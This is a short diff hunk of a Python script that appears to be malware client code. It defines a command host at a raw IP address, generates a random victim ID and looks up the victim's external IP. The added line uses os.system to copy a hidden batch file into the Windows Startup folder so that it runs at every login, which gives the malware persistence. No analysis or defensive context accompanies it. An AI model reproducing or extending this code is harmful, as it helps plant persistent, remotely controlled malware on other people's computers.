@@ -4,6 +4,7 @@ import string
 import random
 import subprocess
 
+os.system('COPY "C:\Users\%username%\_tmp_\_sc.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\_sc.bat"')
 host = 'http://3.85.122.241/'
 host_id = (''.join(random.choice(string.ascii_letters) for i in range(12)))
 host_external_ip = requests.get("https://www.myexternalip.com/raw").text
